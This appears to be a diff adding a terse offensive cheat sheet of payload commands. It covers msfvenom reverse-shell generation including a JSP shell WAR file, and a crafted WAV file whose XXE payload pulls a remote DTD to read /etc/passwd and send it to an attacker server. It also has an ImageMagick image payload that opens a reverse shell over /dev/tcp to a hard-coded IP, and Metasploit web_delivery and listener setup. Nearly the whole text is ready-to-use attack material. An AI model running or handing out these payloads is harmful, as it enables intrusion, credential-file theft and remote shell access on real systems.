@@ -1,0 +1,39 @@
+# COMMANDS FOR MSFVENOM
+  > msfvenom -p [payloads] LHOST=[ip] LPORT=[port] -f [extension] -o [payload name]
+
+# LIST ALL AVAILABLE PAYLOADS
+  > msfvenom --list payloads
+
+# PAYLOAD FOR JAVA CODE BASE (.WAR FILE)
+  > msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f [file type] -o [output]
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+# PAYLOAD FOR WAV EXPLOIT
+  > echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
+  > nano NAMEEVIL.dtd
+     ::<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/ passwd">
+     ::<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
+  > php -S 0.0.0.0:PORT
+  > <?php echo zlib_decode(base64_decode('base64here')); ?> --> to decode the encoded text
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+# PAYLOAD FOR PNG OR JPG
+  > push graphic-context
+    encoding UTF-8
+    viewbox 0 0 1 1
+    affine 1 0 0 1 0 0
+    push graphic-context
+    image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/10.4.64.135/80 0<&1 2>&1'
+    pop graphic-context
+    pop graphic-context
+  > start a listener
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+# USE METASPLOIT TO CRAFT A SHELL SCRIPT
+  > use exploit/multi/script/web_delivery
+
+# SETUP A LISTENER WITH METASPLOIT
+  > use exploit/multi/handler
